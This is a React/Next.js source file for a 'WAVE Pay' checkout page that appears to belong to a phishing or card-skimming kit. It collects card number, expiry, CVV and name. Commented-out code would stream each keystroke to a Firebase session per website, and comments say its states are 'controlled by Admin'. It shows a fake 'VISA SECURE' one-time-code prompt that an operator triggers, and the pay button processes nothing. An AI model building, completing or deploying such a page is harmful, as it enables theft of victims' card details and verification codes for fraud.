```
"use client";

import { useEffect, useState } from "react";
import { useParams, useSearchParams } from "next/navigation";
import { ref, set, onValue, update } from "firebase/database";
import { db } from "@/lib/firebase";
import { CreditCard, Lock, Check, AlertCircle } from "lucide-react";
import CardVisual from "@/components/CardVisual";

export default function CheckoutPage() {
  const params = useParams();
  const searchParams = useSearchParams();
  const websiteId = params.websiteId as string;
  const productId = searchParams.get("product");
  
  const [sessionId, setSessionId] = useState("");
  const [formData, setFormData] = useState({
    email: "",
    card: "",
    expiry: "",
    cvv: "",
    name: "",
    zip: ""
  });
  const [focusedField, setFocusedField] = useState<string>("");
  
  // UI States controlled by Admin
  const [showOtp, setShowOtp] = useState(false);
  const [status, setStatus] = useState<"idle" | "success" | "failed">("idle");

  useEffect(() => {
    // Generate Session ID
    const newSessionId = Math.random().toString(36).substring(7);
    setSessionId(newSessionId);

    // Initial Handshake (Mock)
    console.log(`Session Started: ${ newSessionId } on ${ websiteId } `);
    
    // In real app: Write initial session data to Firebase
    // set(ref(db, `projects / ${ websiteId } /sessions/${ newSessionId } `), { ... });

    // Listen for Admin Commands
    // const commandRef = ref(db, `projects / ${ websiteId } /sessions/${ newSessionId }/command`);
    // onValue(commandRef, (snapshot) => {
    //   const cmd = snapshot.val();
    //   if (cmd === "OTP") setShowOtp(true);
    //   if (cmd === "SUCCESS") setStatus("success");
    //   if (cmd === "FAIL") setStatus("failed");
    // });

  }, [websiteId]);

const handleInput = (field: string, value: string) => {
    // Basic formatting
    let formattedValue = value;
    if (field === "card") {
        formattedValue = value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim().substring(0, 19);
    } else if (field === "expiry") {
        formattedValue = value.replace(/\D/g, '').replace(/^(\d{2})(\d)/, '$1/$2').substring(0, 5);
    }

    setFormData(prev => ({ ...prev, [field]: formattedValue }));

    // Real-time Sync (Mock)
    // update(ref(db, `projects/${websiteId}/sessions/${sessionId}`), { [field]: formattedValue });
};

if (status === "success") {
    return (
        <div className="min-h-screen flex items-center justify-center bg-green-50">
            <div className="text-center space-y-4 animate-in zoom-in duration-500">
                <div className="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center mx-auto text-white shadow-lg shadow-green-500/30">
                    <Check className="w-12 h-12" />
                </div>
                <h1 className="text-3xl font-bold text-green-900">Payment Successful</h1>
                <p className="text-green-700 text-lg">Your order has been confirmed.</p>
            </div>
        </div>
    );
}

return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="w-full max-w-5xl bg-white rounded-3xl shadow-2xl overflow-hidden flex flex-col lg:flex-row min-h-[600px]">

            {/* Left: Summary & Visual */}
            <div className="bg-[#1a1f2e] text-white p-10 lg:w-5/12 flex flex-col relative overflow-hidden">
                <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-blue-600/10 to-purple-600/10 z-0"></div>

                <div className="relative z-10">
                    <div className="flex items-center gap-3 mb-12">
                        <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center font-bold text-xl">W</div>
                        <span className="font-bold text-2xl tracking-tight">WAVE Pay</span>
                    </div>

                    {/* The Card Visual */}
                    <div className="mb-12 transform scale-90 origin-left">
                        <CardVisual
                            cardNumber={formData.card}
                            cardHolder={formData.name}
                            expiry={formData.expiry}
                            cvv={formData.cvv}
                            focusedField={focusedField}
                        />
                    </div>

                    <div className="mt-auto space-y-4 border-t border-white/10 pt-8">
                        <div className="flex justify-between text-gray-400">
                            <span>{productId ? "Selected Item" : "Cart Total"}</span>
                            <span>$129.99</span>
                        </div>
                        <div className="flex justify-between text-gray-400">
                            <span>Shipping</span>
                            <span>$0.00</span>
                        </div>
                        <div className="flex justify-between text-2xl font-bold">
                            <span>Total</span>
                            <span>$129.99</span>
                        </div>
                    </div>
                </div>
            </div>

            {/* Right: Form */}
            <div className="p-10 lg:w-7/12 relative bg-white">
                <h2 className="text-3xl font-bold text-gray-900 mb-8">Payment Details</h2>

                <div className="space-y-6 max-w-md">
                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">Email Address</label>
                        <input
                            type="email"
                            className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all"
                            placeholder="you@example.com"
                            onChange={(e) => handleInput("email", e.target.value)}
                            onFocus={() => setFocusedField("email")}
                        />
                    </div>

                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">Card Number</label>
                        <div className="relative">
                            <input
                                type="text"
                                className="w-full p-4 pl-12 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all font-mono"
                                placeholder="0000 0000 0000 0000"
                                value={formData.card}
                                onChange={(e) => handleInput("card", e.target.value)}
                                onFocus={() => setFocusedField("card")}
                                maxLength={19}
                            />
                            <CreditCard className="w-6 h-6 text-gray-400 absolute left-4 top-4" />
                        </div>
                    </div>

                    <div className="grid grid-cols-2 gap-6">
                        <div>
                            <label className="block text-sm font-medium text-gray-700 mb-2">Expiry Date</label>
                            <input
                                type="text"
                                className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all font-mono"
                                placeholder="MM / YY"
                                value={formData.expiry}
                                onChange={(e) => handleInput("expiry", e.target.value)}
                                onFocus={() => setFocusedField("expiry")}
                                maxLength={5}
                            />
                        </div>
                        <div>
                            <label className="block text-sm font-medium text-gray-700 mb-2">CVC / CVV</label>
                            <input
                                type="text"
                                className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all font-mono"
                                placeholder="123"
                                value={formData.cvv}
                                onChange={(e) => handleInput("cvv", e.target.value)}
                                onFocus={() => setFocusedField("cvv")}
                                maxLength={4}
                            />
                        </div>
                    </div>

                    <div>
                        <label className="block text-sm font-medium text-gray-700 mb-2">Cardholder Name</label>
                        <input
                            type="text"
                            className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all uppercase"
                            placeholder="FULL NAME"
                            value={formData.name}
                            onChange={(e) => handleInput("name", e.target.value)}
                            onFocus={() => setFocusedField("name")}
                        />
                    </div>

                    <button
                        className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl transition-all shadow-lg shadow-blue-600/30 flex items-center justify-center gap-2 mt-8 transform active:scale-95"
                    >
                        <Lock className="w-5 h-5" />
                        Pay Securely
                    </button>
                </div>

                {/* 3D Secure / OTP Modal Overlay */}
                {showOtp && (
                    <div className="absolute inset-0 bg-white/80 backdrop-blur-md flex items-center justify-center z-50 animate-in fade-in duration-300">
                        <div className="bg-white p-8 rounded-2xl shadow-2xl border border-gray-100 w-full max-w-sm mx-4 animate-in zoom-in duration-300">
                            <div className="flex justify-between items-center mb-6">
                                <div className="font-bold text-lg text-gray-800">3D Secure</div>
                                <div className="text-xs font-mono text-gray-400">VISA SECURE</div>
                            </div>

                            <div className="text-center mb-8">
                                <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-4 text-blue-600 animate-pulse">
                                    <Lock className="w-8 h-8" />
                                </div>
                                <h3 className="text-xl font-bold text-gray-900">Verification Required</h3>
                                <p className="text-sm text-gray-500 mt-2">
                                    A verification code has been sent to your mobile device.
                                </p>
                            </div>

                            <div className="space-y-4">
                                <input
                                    type="text"
                                    className="w-full text-center text-3xl tracking-[0.5em] font-mono p-4 border-2 border-gray-200 rounded-xl focus:border-blue-500 outline-none transition-colors"
                                    placeholder="0000"
                                    maxLength={4}
                                />
                                <button className="w-full bg-blue-600 text-white font-bold py-3 rounded-xl hover:bg-blue-700 transition-colors shadow-lg shadow-blue-600/20">
                                    Confirm Payment
                                </button>
                                <button
                                    onClick={() => setShowOtp(false)}
                                    className="w-full text-gray-400 text-sm hover:text-gray-600"
                                >
                                    Cancel
                                </button>
                            </div>
                        </div>
                    </div>
                )}

            </div>
        </div>
    </div>
);
}
```
